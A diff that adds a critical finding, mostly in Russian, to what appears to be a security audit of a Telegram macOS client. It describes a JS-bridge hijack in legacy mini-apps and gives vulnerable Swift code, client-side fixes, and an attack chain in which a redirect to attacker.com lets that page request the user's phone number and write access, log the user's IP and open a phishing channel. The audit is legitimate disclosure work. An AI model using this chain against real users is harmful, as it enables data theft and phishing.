@@ -175,6 +175,155 @@ The subsequent `savePanel(file:named:for:)` uses an `NSSavePanel`, which require
 
 ---
 
+## Finding 4 — CRITICAL
+
+### JS-Bridge Hijacking via Navigation Bypass на legacy Mini-Apps (`sameOrigin == false`)
+
+**Файлы:**  
+- `WebpageModalController.swift:1271–1310` (инъекция JS-прокси)  
+- `WebpageModalController.swift:1602–1624` (навигационная политика)  
+- `WebpageModalController.swift:1691–1708` (проверка доверия сообщений)  
+- `WebpageModalController.swift:2892–2901` (обратная передача событий в WebView)  
+**CVSS estimate:** 8.1 (AV:N/AC:H/PR:N/UI:R/S:C/C:H/I:H/A:N)
+
+#### Три уязвимых компонента в связке
+
+**Компонент A — JS-прокси без проверки origin (legacy-путь):**
+
+```swift
+// Строка 1271–1310
+if let requestData, requestData.sameOrigin {
+    // БЕЗОПАСНЫЙ путь: прокси регистрируется только если window.location.origin == trustedOrigin
+    let userScript = WKUserScript(source: webAppSecuredEventProxySource(trustedOrigin: trustedOrigin), ...)
+} else {
+    // УЯЗВИМЫЙ путь: прокси регистрируется для ЛЮБОЙ страницы без проверки origin
+    let userScript = WKUserScript(source: js, injectionTime: .atDocumentStart, forMainFrameOnly: true)
+}
+```
+
+Скрипт `js`:
+```javascript
+var TelegramWebviewProxyProto = function() {};
+TelegramWebviewProxyProto.prototype.postEvent = function(eventName, eventData) {
+    window.webkit.messageHandlers.performAction.postMessage({'eventName': eventName, 'eventData': eventData});
+};
+var TelegramWebviewProxy = new TelegramWebviewProxyProto(); // нет проверки origin
+```
+
+**Компонент B — навигационная политика разрешает ВСЕ нажатые не пользователем переходы:**
+
+```swift
+// Строка 1621–1623
+} else {
+    decisionHandler(.allow)  // JS-редирект, meta refresh, HTTP 302 — всё пропускается
+}
+```
+
+**Компонент C — `isTrustedMainFrameMessage` доверяет ЛЮБОМУ сообщению от main frame:**
+
+```swift
+// Строка 1695–1696
+guard self.requestData?.sameOrigin == true else {
+    return true  // sameOrigin == false → любое сообщение из main frame TRUSTED
+}
+```
+
+И в обратную сторону:
+```swift
+// Строка 2892–2897
+public func sendEvent(name: String, data: String?) {
+    if self.requestData?.sameOrigin == true {
+        guard let trustedOrigin = ..., webAppOrigin(url: currentUrl) == trustedOrigin else {
+            return  // защита только для sameOrigin == true
+        }
+    }
+    // для sameOrigin == false: данные уходят на ЛЮБУЮ страницу в WebView
+```
+
+#### Полная цепочка атаки
+
+```
+[Легитимный бот] открывает mini-app с sameOrigin==false
+        │
+        ▼
+[mini-app страница] делает программный редирект:
+    window.location.href = "https://attacker.com/bridge_hijack"
+        │
+        ▼
+[Навигационная политика] type != .linkActivated → decisionHandler(.allow)
+        │
+        ▼
+[WKWebView] загружает attacker.com
+        │
+        ▼
+[WKUserScript .atDocumentStart] регистрирует TelegramWebviewProxy для attacker.com
+        │
+        ▼
+[attacker.com JS] вызывает bridge API без ограничений:
+    TelegramWebviewProxy.postEvent("web_app_share_to_story",
+        JSON.stringify({media_url: "https://attacker.com/ip_log"}))
+    // Утечка IP — без взаимодействия пользователя
+
+    TelegramWebviewProxy.postEvent("web_app_request_phone", null)
+    // Диалог "поделиться номером" — пользователь думает, что это Бот X
+
+    TelegramWebviewProxy.postEvent("web_app_request_write_access", null)
+    // "Разрешить Боту X отправлять сообщения?" — результат идёт на attacker.com
+
+    TelegramWebviewProxy.postEvent("web_app_open_tg_link",
+        JSON.stringify({path_full: "/attacker_phishing_channel"}))
+    // Редирект на фишинговый канал — без нажатия
+        │
+        ▼
+[isTrustedMainFrameMessage] sameOrigin==false → return true → TRUSTED
+[sendEvent] sameOrigin==false → данные уходят на attacker.com
+```
+
+#### Почему это CRITICAL, а не просто HIGH
+
+1. **Масштаб**: все mini-apps, созданные до введения `sameOrigin == true`, работают в уязвимом режиме. Это большинство из тысяч существующих ботов.
+
+2. **Для эксплуатации не нужен XSS**: достаточно HTTP 302-редиректа с сервера mini-app (server-side open redirect), либо штатной логики самого бота. Если бот скомпрометирован на уровне сервера — полная компрометация пользователя через bridge.
+
+3. **Доверие пользователя обмануто**: UI по-прежнему показывает «Бот X», пока диалоги телефона/write_access отображаются — пользователь думает, что делится данными с Ботом X, хотя ответы уходят на `attacker.com`.
+
+4. **`sendEvent` также без защиты**: ответы на разрешения (phone, write_access) передаются обратно на `attacker.com`, а не на легитимный сервер бота.
+
+#### Исправление
+
+**Клиентская сторона** (не зависит от сервера):
+```swift
+// В isTrustedMainFrameMessage: убрать исключение для sameOrigin==false
+private func isTrustedMainFrameMessage(_ message: WKScriptMessage) -> Bool {
+    guard message.frameInfo.isMainFrame else { return false }
+    // УДАЛИТЬ: guard self.requestData?.sameOrigin == true else { return true }
+    guard let trustedOrigin = self.trustedOrigin else { return false }
+    guard webAppOrigin(securityOrigin: message.frameInfo.securityOrigin) == trustedOrigin else { return false }
+    ...
+}
+
+// В webAppSecuredEventProxySource: всегда использовать origin-aware инъекцию
+if let requestData, requestData.sameOrigin {
+    ...
+} else {
+    // Тоже использовать webAppSecuredEventProxySource с origin из requestData.url
+    let userScript = WKUserScript(source: webAppSecuredEventProxySource(trustedOrigin: legacyOrigin), ...)
+}
+
+// В навигационной политике: запретить переход в другой origin
+} else {
+    if let newUrl = navigationAction.request.url,
+       let currentUrl = URL(string: self.url),
+       webAppOrigin(url: newUrl) != webAppOrigin(url: currentUrl) {
+        decisionHandler(.cancel)  // блокировать навигацию в другой origin
+    } else {
+        decisionHandler(.allow)
+    }
+}
+```
+
+---
+
 ## Out of Scope / Not Reproduced on macOS
 
 - **SmartGlocal URL suffix bypass** — macOS uses HOST-based validation (`host.hasSuffix(".smart-glocal.com")`), unlike Desktop/Android which used path-based suffix. **Not vulnerable.**
